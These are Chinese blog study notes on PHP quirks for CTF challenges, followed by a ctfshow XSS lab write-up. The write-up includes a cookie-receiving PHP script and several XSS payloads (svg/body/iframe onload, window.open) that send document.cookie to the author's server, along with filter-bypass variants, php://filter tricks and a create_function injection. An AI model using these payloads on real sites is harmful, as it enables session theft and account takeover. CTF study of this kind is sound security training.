id="GET-POST传递变量特性（-）"><a href="#GET-POST传递变量特性（-）" class="headerlink" title="GET&#x2F;POST传递变量特性（[）"></a>GET&#x2F;POST传递变量特性（[）</h3><p>在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、[，+、点转换为下划线，而传入[之后后面的空格、[，+、点就不会被转为下划线了</p><hr><h3 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER[]"></a>$_SERVER[]</h3><p><strong>$_SERVER[‘argv’]：传递给脚本的参数数组。</strong></p><p><strong>命令行情况下，$_SERVER[‘argv’][0]第一个元素是脚本的文件名（test.php），之后的元素是传递给脚本的参数（test1、test2）<br>在这里插入图片描述<br>web网页模式下，$arg只接受GET传参，且必须在php.ini开启register_argc_argv配置项。$_SERVER[‘argv’][0] &#x3D; $_SERVER[‘QUERY_STRING’] &#x3D; GET传参的值（?后面的），关于$_SERVER[‘QUERY_STRING’]</strong></p><hr><h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><p><strong>相当于eval()，也是危险函数，他能将其中的字符串当做php代码来执行，且assert不需要严格遵从语法，比如末尾的分号可以不加。</strong></p><hr><h3 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h3><p>PHP extract()函数从<a href="https://baike.baidu.com/item/%E6%95%B0%E7%BB%84/0?fromModule=lemma_inlink">数组</a>中把<a href="https://baike.baidu.com/item/%E5%8F%98%E9%87%8F/0?fromModule=lemma_inlink">变量</a>导入到当前的<a href="https://baike.baidu.com/item/%E7%AC%A6%E5%8F%B7%E8%A1%A8/0?fromModule=lemma_inlink">符号表</a>中。 </p><p>对于数组中的每个元素，键名用于变量名，键值用于<a href="https://baike.baidu.com/item/%E5%8F%98%E9%87%8F%E5%80%BC/8414141?fromModule=lemma_inlink">变量值</a>。</p><p>第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract()函数如何对待这样的冲突。</p><p>本函数返回成功设置的变量数目。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">语法：<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-keyword">array</span>,extract_rules,prefix)<br><br>例子<br><span class="hljs-variable">$my_array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-string">&quot;Cat&quot;</span>,<span class="hljs-string">&quot;b&quot;</span> =&gt; <span class="hljs-string">&quot;Dog&quot;</span>, <span class="hljs-string">&quot;c&quot;</span> =&gt; <span class="hljs-string">&quot;Horse&quot;</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$my_array</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\$a = <span class="hljs-subst">$a</span>; \$b = <span class="hljs-subst">$b</span>; \$c = <span class="hljs-subst">$c</span>&quot;</span>;<span class="hljs-meta">?&gt;</span><br>输出：<br><span class="hljs-variable">$a</span> = Cat; <span class="hljs-variable">$b</span> = Dog; <span class="hljs-variable">$c</span> = Horse<br></code></pre></td></tr></table></figure><hr><h3 id="SERVER-‘QUERY-STRING’"><a href="#SERVER-‘QUERY-STRING’" class="headerlink" title="$_SERVER[‘QUERY_STRING’]"></a>$_SERVER[‘QUERY_STRING’]</h3><p><a href="https://blog.csdn.net/qq_49480008/article/details/115872899">https://blog.csdn.net/qq_49480008/article/details/115872899</a></p><p><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>获取的是GET传参数据（<code>?</code>后面的键值）</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">例如：<br>?<span class="hljs-attribute">ctf_show</span>=123<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br>echo <span class="hljs-variable">$a</span>;<br><br>输出<br><span class="hljs-string">&#x27;ctf_show=123&#x27;</span><br></code></pre></td></tr></table></figure><hr><h3 id="gettext"><a href="#gettext" class="headerlink" title="gettext"></a>gettext</h3><p><strong>_() 函数即 gettext() 函数，可以将参数翻译成指定语言，一般就是原封不动的输出参数</strong></p><p><strong>string gettext( string $message) 返回输入的字符</strong><br><strong>_()&#x3D;&#x3D;gettext() 是gettext()的拓展函数，开启text扩展，_是gettext的别名。需要php扩展目录下有php_gettext.dll</strong></p><p><strong>echo gettext(“Welcome to My PHP Application”);</strong></p><hr><h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><p><strong>get_defined_vars — 返回由所有已定义变量所组成的数组</strong></p><hr><h3 id="stripos"><a href="#stripos" class="headerlink" title="stripos()"></a>stripos()</h3><p>stripos</p><p>注意：如果参数为数组，直接输出null</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><span class="hljs-function"><span class="hljs-title">stripos</span> </span><br><span class="hljs-function"><span class="hljs-params">(PHP <span class="hljs-number">5</span>, PHP <span class="hljs-number">7</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">stripos</span> — 查找字符串首次出现的位置（不区分大小写）</span><br><span class="hljs-function">说明 </span><br><span class="hljs-function"><span class="hljs-title">mixed</span> <span class="hljs-title">stripos</span><span class="hljs-params">( string <span class="hljs-string">$h</span>aystack, string <span class="hljs-string">$n</span>eedle[, int <span class="hljs-string">$o</span>ffset = <span class="hljs-number">0</span>] )</span></span><br><span class="hljs-function">返回在字符串 <span class="hljs-title">haystack</span> 中 <span class="hljs-title">needle</span> 首次出现的数字位置。 </span><br><span class="hljs-function">与 <span class="hljs-title">strpos</span><span class="hljs-params">()</span> 不同，<span class="hljs-title">stripos</span><span class="hljs-params">()</span> 不区分大小写。 </span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function">参数 </span><br><span class="hljs-function"><span class="hljs-title">haystack</span></span><br><span class="hljs-function">在该字符串中查找。 </span><br><span class="hljs-function"><span class="hljs-title">needle</span></span><br><span class="hljs-function">注意 <span class="hljs-title">needle</span> 可以是一个单字符或者多字符的字符串。 </span><br><span class="hljs-function">如果 <span class="hljs-title">needle</span> 不是一个字符串，那么它将被转换为整型并被视为字符顺序值。 </span><br><span class="hljs-function"><span class="hljs-title">offset</span></span><br><span class="hljs-function">可选的 <span class="hljs-title">offset</span> 参数，从字符此数量的开始位置进行搜索。如果是负数，就从字符末尾此数量的字符数开始统计。 </span><br><span class="hljs-function"></span><br><span class="hljs-function">返回值 </span><br><span class="hljs-function">返回 <span class="hljs-title">needle</span> 存在于 <span class="hljs-title">haystack</span> 字符串开始的位置<span class="hljs-params">(独立于偏移量)</span>。同时注意字符串位置起始于 0，而不是 1。 </span><br><span class="hljs-function">如果未发现 <span class="hljs-title">needle</span> 将返回 FALSE。 </span><br></code></pre></td></tr></table></figure><hr><h3 id="readfile"><a href="#readfile" class="headerlink" title="readfile()"></a>readfile()</h3><p>readfile</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span>, <span class="hljs-keyword">bool</span> <span class="hljs-variable">$use_include_path</span> = <span class="hljs-literal">false</span>, resource <span class="hljs-variable">$context</span> = ?): <span class="hljs-keyword">int</span><br> 读取文件并写入到输出缓冲。 <br> <br>参数<br>filename<br>    要读取的文件名。<br>use_include_path<br>    想要在 include_path 中搜索文件，可使用这个可选的第二个参数，设为 <span class="hljs-literal">true</span>。<br>context<br>    Stream 上下文（context） resource。<br>返回值<br>成功时返回从文件中读入的字节数， 或者在失败时返回 <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><hr><h3 id="php伪协议嵌套无效协议"><a href="#php伪协议嵌套无效协议" class="headerlink" title="php伪协议嵌套无效协议"></a>php伪协议嵌套无效协议</h3><p>php伪协议在遇到无效协议时，会自动忽略。</p><p>当我们的伪协议中需要包含一些内容，但又不影响我们的读取，就可以使用这种方法</p><p>例如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">?f=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode|ctfshow/</span>resource=flag.php<br>?f=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/|ctfshow/</span>resource=flag.php<br></code></pre></td></tr></table></figure><hr><h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p><a href="https://www.cnblogs.com/milantgh/p/3756726.html">目录穿越详解</a></p><hr><h3 id="PCRE回溯次数绕过"><a href="#PCRE回溯次数绕过" class="headerlink" title="PCRE回溯次数绕过"></a>PCRE回溯次数绕过</h3><p>1.正则最大回溯次数绕过<br> PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br> 回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。这样我们就可以绕过第一个正则表达式了。</p><p>python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&quot;&quot;</span><br>data=&#123;<span class="hljs-string">&#x27;f&#x27;</span>:<span class="hljs-string">&#x27;very&#x27;</span>*<span class="hljs-number">250000</span>+<span class="hljs-string">&#x27;ctfshow&#x27;</span> &#125; r=requests.post(url,data=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><hr><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><p><strong><code>exec(string $command, array &amp;$output = ?, int &amp;$return_var = ?): string</code></strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">exec</span>() 执行 command 参数所指定的命令。<br>例：<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 输出运行中的 php/httpd 进程的创建者用户名</span><br><span class="hljs-comment">// （在可以执行 &quot;whoami&quot; 命令的系统上）</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><hr><h3 id="tee（linux）"><a href="#tee（linux）" class="headerlink" title="tee（linux）"></a>tee（linux）</h3><p>tee命令是Linux中常用的命令。这是一个简单但功能强大的命令，用于读取标准输入，然后将其写入文件以及标准输出。</p><p>下是 tee 命令的一些最常用选项 -</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">-a, --<span class="hljs-built_in">append</span><br></code></pre></td></tr></table></figure><p>此选项将标准输入附加到指定文件的末尾而不是覆盖它们。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">-</span>i, <span class="hljs-comment">--ignore-interrupts</span><br></code></pre></td></tr></table></figure><p>该选项忽略中断信号（如Ctrl+C）并继续运行。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">-</span>p, <span class="hljs-comment">--output-error</span><br></code></pre></td></tr></table></figure><p>此选项可防止 tee 命令因写入错误而退出。</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">--<span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><p>此选项显示 tee 命令的帮助消息。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">--version</span><br></code></pre></td></tr></table></figure><p>此选项显示 tee 命令的版本号。</p><p><strong>常用功能：</strong></p><p><strong>将标准输入写入文件：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Hello,world!&quot;</span> | <span class="hljs-built_in">tee</span> hello.txt</span><br><br>这里是将语句写入到文件中<br></code></pre></td></tr></table></figure><p><strong>将标准输入附加到文件：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Hello,world again!&quot;</span> | <span class="hljs-built_in">tee</span> -a hello.txt</span><br><br>将语句追加到文件中<br></code></pre></td></tr></table></figure><hr><h3 id="类的静态方法的调用"><a href="#类的静态方法的调用" class="headerlink" title="类的静态方法的调用"></a>类的静态方法的调用</h3><p><strong>语法：类+::+方法名</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">-&gt;与::调用函数的区别：<br>-&gt; 调用实例方法<br>:: 调用静态方法<br>在类里面的时候，<span class="hljs-variable">$this</span>-&gt;func()和self::func()没什么区别。<br>在外部的时候，-&gt;必须是实例化后的对象使用；而::可以是未实例化的类名直接调用。<br></code></pre></td></tr></table></figure><hr><h3 id="strripos"><a href="#strripos" class="headerlink" title="strripos()"></a>strripos()</h3><p><strong>strripos — 计算指定字符串在目标字符串中最后一次出现的位置（不区分大小写）</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">strripos</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$haystack</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$needle</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$offset</span> = <span class="hljs-number">0</span>): <span class="hljs-keyword">int</span><br>以不区分大小写的方式查找指定字符串在目标字符串中最后一次出现的位置。与 <span class="hljs-title function_ invoke__">strrpos</span>() 不同，<span class="hljs-title function_ invoke__">strripos</span>() 不区分大小写。 <br><br>haystack<br>    在此字符串中进行查找。<br>needle<br>    注意 needle 可以是一个单字符或者多字符的字符串。<br>offset<br>    参数 offset 可以被指定来查找字符串中任意长度的子字符串。<br>    负数偏移量将使得查找从字符串的起始位置开始，到 offset 位置为止。<br>   <br>返回 needle 相对于 haystack 字符串的位置(和搜索的方向和偏移量无关)。同时注意字符串的起始位置为<span class="hljs-number">0</span>而非<span class="hljs-number">1</span>。<br>如果 needle 未被发现，返回 <span class="hljs-literal">false</span>。 <br></code></pre></td></tr></table></figure><hr><h3 id="无字母数字命令执行"><a href="#无字母数字命令执行" class="headerlink" title="无字母数字命令执行"></a>无字母数字命令执行</h3><p>yu22x的关于绕过正则表达式的文章：</p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">无字母数字命令执行绕过正则总结包括各种绕过脚本</a></p><hr><h3 id="create-function（）"><a href="#create-function（）" class="headerlink" title="create_function（）"></a>create_function（）</h3><p>create_function()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs undefined">create_function的第一个参数是参数，第二个参数是内容。<br><br>create_function(&#x27;$a&#x27;,&#x27;return 123&#x27;)<br><br>类似于：<br>function f($a) &#123;<br>  return 123;<br>&#125;<br><br>如果我们第二个参数传入 echo 1;&#125;phpinfo();//<br>function f($a) &#123;<br>  echo 1;&#125;phpinfo();//<br>&#125;<br>可以执行phpinfo()命令<br></code></pre></td></tr></table></figure><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> php特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-xss</title>
      <link href="/2025/02/23/ctfshow-xss/"/>
      <url>/2025/02/23/ctfshow-xss/</url>
      
        <content type="html"><![CDATA[<h1 id="web-xss"><a href="#web-xss" class="headerlink" title="web-xss"></a>web-xss</h1><h1 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h1><h2 id="web-316（无过滤）"><a href="#web-316（无过滤）" class="headerlink" title="web-316（无过滤）"></a>web-316（无过滤）</h2><p>打开页面发现有个输入框，并从题目可以看到这关为反射性xss</p><p><img src="/../image/web-xss-1.png"></p><p>尝试写入<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>可以弹框</p><p><img src="/../image/web-xss-2.png"></p><p>这关的flag藏在admin管理员的cookie中</p><p>所以我们在我们自己的云服务器中写一个用来接收cookie的php文件，名为cookie.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$cookie</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>];<br>    <br>    <span class="hljs-comment">// 过滤和清理用户输入</span><br>    <span class="hljs-variable">$cookie</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$cookie</span>); <span class="hljs-comment">// 过滤特殊字符</span><br>    <span class="hljs-comment">// 其他可能的过滤和验证</span><br> <br>    <span class="hljs-comment">// 写入文件</span><br>    <span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;cookie.txt&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$myfile</span> !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>, <span class="hljs-variable">$cookie</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Cookie 已成功写入文件。&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;无法打开文件进行写入。&#x27;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;未提供 cookie 数据。&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后再输入框中输入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;http://服务器IP/cookie.php?cookie=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当这行代码提交后会有类似admin管理员的程序每隔一段时间就查看我们提交的连接，然后就可以拿到admin的cookie，我们服务器端目录内就会生成cookie.txt，flag就在里面</p><h2 id="web-317（script过滤绕过）"><a href="#web-317（script过滤绕过）" class="headerlink" title="web-317（script过滤绕过）"></a>web-317（script过滤绕过）</h2><p>使用上一关的payload不行，猜测是过滤了script，尝试了下大小写混合也不行。</p><p>试了<code>&lt;img src=&#39;&#39; onerror=&#39;alert(1)&#39;&gt;</code>能弹窗，但是拿不到cookie</p><p>试下<code>&lt;body οnlοad=&#39;alert(1)&#39;&gt;</code>和<code>&lt;svg onload=&#39;alert(1)&#39;&gt;</code>发现可以</p><p><strong>onload属性：只要标签被加载就会触发</strong></p><p><strong>location.href：重定向到指定的url连接</strong></p><p>使用</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;svg <span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;location.href=&#x27;http://服务器IP/cookie.php?cookie=&#x27;+document.cookie&quot;</span>/&gt;<br><br>或者<br><br>&lt;body <span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;window.location.href=&#x27;http://服务器IP/cookie.php?cookie=&#x27;+document.cookie&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h2 id="web-318（img，script过滤绕过）"><a href="#web-318（img，script过滤绕过）" class="headerlink" title="web-318（img，script过滤绕过）"></a>web-318（img，script过滤绕过）</h2><p>试了一下发现过滤了img和script，继续使用上一关的payload即可</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;svg <span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;location.href=&#x27;http://服务器IP/cookie.php?cookie=&#x27;+document.cookie&quot;</span>/&gt;<br><br>或者<br><br>&lt;body <span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;window.location.href=&#x27;http://服务器IP/cookie.php?cookie=&#x27;+document.cookie&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h2 id="web-319（body，script过滤绕过）"><a href="#web-319（body，script过滤绕过）" class="headerlink" title="web-319（body，script过滤绕过）"></a>web-319（body，script过滤绕过）</h2><p>试了下发现body又被过滤了，但是svg依然没被过滤，还是可以用<code>&lt;svg onload=&#39;alert(1)&#39;&gt;</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;svg <span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;location.href=&#x27;http://服务器IP/cookie.php?cookie=&#x27;+document.cookie&quot;</span>/&gt;<br><br>或者<br><br>&lt;iframe οnlο<span class="hljs-attribute">ad</span>=<span class="hljs-string">&quot;document.location=&#x27;http://服务器ip/cookie.php?cookie=&#x27;+document.cookie&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h2 id="web-320（空格过滤绕过）"><a href="#web-320（空格过滤绕过）" class="headerlink" title="web-320（空格过滤绕过）"></a>web-320（空格过滤绕过）</h2><p>在之前的基础上又多过滤了空格，这里有好几种绕过方法</p><p>%0A换行符，%09（就是空格，这里好像绕过不了），&#x2F;，&#x2F;**&#x2F;</p><p><strong>尝试<code>&lt;svg/onload=&#39;alert(1)&#39;&gt;</code>成功弹框，</strong></p><p>这里试了下%0A发现不行，&#x2F;**&#x2F;可以</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;svg/<span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;window.location.href=&#x27;http://服务器IP/cookie.php?cookie=&#x27;+document.cookie&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h2 id="web-321"><a href="#web-321" class="headerlink" title="web-321"></a>web-321</h2><p>用上一题的payload即可</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;svg/<span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;window.location.href=&#x27;http://服务器IP/cookie.php?cookie=&#x27;+document.cookie&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h2 id="web-322（xss过滤绕过）"><a href="#web-322（xss过滤绕过）" class="headerlink" title="web-322（xss过滤绕过）"></a>web-322（xss过滤绕过）</h2><p>这题多过滤了一个xss，但是我们之前的payload中没有xss，所以用之前的payload即可</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;svg/<span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;window.location.href=&#x27;http://服务器IP/cookie.php?cookie=&#x27;+document.cookie&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h2 id="web-323-326"><a href="#web-323-326" class="headerlink" title="web-323-326"></a>web-323-326</h2><p>一直到326都和上题一样解法</p><h1 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h1><h2 id="web-327（管理员cookie获取）"><a href="#web-327（管理员cookie获取）" class="headerlink" title="web-327（管理员cookie获取）"></a>web-327（管理员cookie获取）</h2><p>要接收管理员的cookie，所以收件人需要是admin才能发送成功</p><p><img src="/../image/web-xss-3.png"></p><h2 id="web-328（管理员cookie获取盗用）"><a href="#web-328（管理员cookie获取盗用）" class="headerlink" title="web-328（管理员cookie获取盗用）"></a>web-328（管理员cookie获取盗用）</h2><p>打开发现是一个登录注册界面。</p><p><img src="/../image/web-xss-4.png"></p><p>发现有一个用户管理页面，只有管理员可见，管理员可以用它看到所有用户的用户名和密码，所以这里就存在存储型的xss漏洞。</p><p><img src="/../image/web-xss-5.png"></p><p>我们在注册时在用户名和密码中插入xss攻击语句，当管理员打开用户管理页面就会触发，我们就能拿到管理员的cookie了</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;http://服务器IP/cookie.php?cookie=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../image/web-xss-6.png"></p><p>拿到cookie之后，然后再访问用户管理界面，用burp抓包，将cookie改成admin的cookie</p><p><strong>注意：这里cookie是会变化的，所以要快，而且要用最新的cookie,这里有点恶心，我试了很多次才成功</strong></p><p><strong>好像在重放器里就不用这么麻烦了。</strong></p><p><img src="/../image/web-xss-7.png"></p><h2 id="web-329"><a href="#web-329" class="headerlink" title="web-329"></a>web-329</h2><p>依旧利用cookie，这题也能得到cookie，但是cookie一下就会失效,原因是，管理员访问了页面就退出了，相当于现在得到的最新cookie是管理员上一次用的cookie</p><p>我们可以通过类名查找元素，通过document来获取</p><p>可以看到前端代码中将要显示admin密码的地方类为<code>layui-table-cell laytable-cell-1-0-1</code></p><p><img src="/../image/web-xss-8.png"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(<span 